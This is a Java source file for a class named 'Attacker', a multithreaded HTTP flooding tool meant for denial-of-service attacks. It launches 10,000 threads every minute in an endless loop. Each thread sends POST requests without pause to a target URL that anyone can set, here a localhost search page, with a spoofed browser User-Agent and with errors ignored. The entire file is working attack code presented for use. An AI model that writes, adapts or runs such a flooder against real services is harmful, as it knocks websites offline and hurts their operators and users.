import java.net.URL;
import java.net.HttpURLConnection;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker {

    // Set the target machine's URL
    public static String TargetMachine = "http://localhost:8880/search.php"; // specify url or ip address in string format

    public static void main(String... args) throws Exception {
        // Create and start attacker threads to perform DDoS attacks in a continuous loop
        while (true) {
            for (int i = 0; i < 10000; i++) {
                System.out.println("Attacking thread(" + i + "); for " + TargetMachine);
                DdosThread thread = new DdosThread();
                thread.start();
            }

            // Sleep for a period before starting the next loop (adjust as needed)
            Thread.sleep(60000); // Sleep for 60 seconds (adjust as needed)
        }
    }


    public static class DdosThread extends Thread {

        // An atomic boolean for controlling the thread's running state
        private AtomicBoolean running = new AtomicBoolean(true);

        // The target URL to attack
        private final String request = TargetMachine;

        // URL object to represent the target
        private final URL url;

        // URL parameter (encoded in UTF-8)
        String param = null;

        public DdosThread() throws Exception {
            // Initialize the URL object with the target machine's URL
            url = new URL(request);

            // Create a parameter for the POST request
            param = "keyword=" + URLEncoder.encode("FFFFF", "UTF-8");
        }

        @Override
        public void run() {
            // Keep running the attack method while the thread is active
            while (running.get()) {
                try {
                    attack(); // Execute the attack method
                } catch (Exception e) {
                    // Handle exceptions here (no action taken in this example)
                }
            }
        }

        public void attack() throws Exception {
            // Create an HTTP connection to the target URL
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Enable input and output for the connection
            connection.setDoOutput(true);
            connection.setDoInput(true);

            // Set the request method to POST
            connection.setRequestMethod("POST");

            // Set request properties (HTTP headers)
            connection.setRequestProperty("charset", "UTF-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            // Set the Content-Length header using the length of the param
            connection.setRequestProperty("Content-Length", String.valueOf(param.length()));

            // Print the thread and HTTP response code
            System.out.println(this + " " + connection.getResponseCode());

            // Get the input stream to read the response, although it's not used in this example
            connection.getInputStream();
        }
    }
}
